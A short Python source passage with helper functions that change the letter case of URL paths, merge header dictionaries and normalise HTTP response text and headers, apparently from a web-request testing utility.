def _random_case(s: str) -> str:
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)


def _apply_path_case(path: str, mode: str) -> str:
    if mode == "lower":
        return path.lower()
    if mode == "upper":
        return path.upper()
    if mode == "random":
        return _random_case(path)
    return path


def _merge_headers(base: dict, extra: dict) -> dict:
    merged = dict(base)
    merged.update(extra)
    return merged


def _get_text(response: Any) -> str:
    """Extract text from httpx.Response or requests.Response."""
    try:
        return response.text or ""
    except Exception:
        return ""


def _get_headers_dict(response: Any) -> dict[str, str]:
    """Normalize response headers to a lowercase-keyed dict."""
    try:
        return {k.lower(): v for k, v in response.headers.items()}
    except Exception:
        return {}

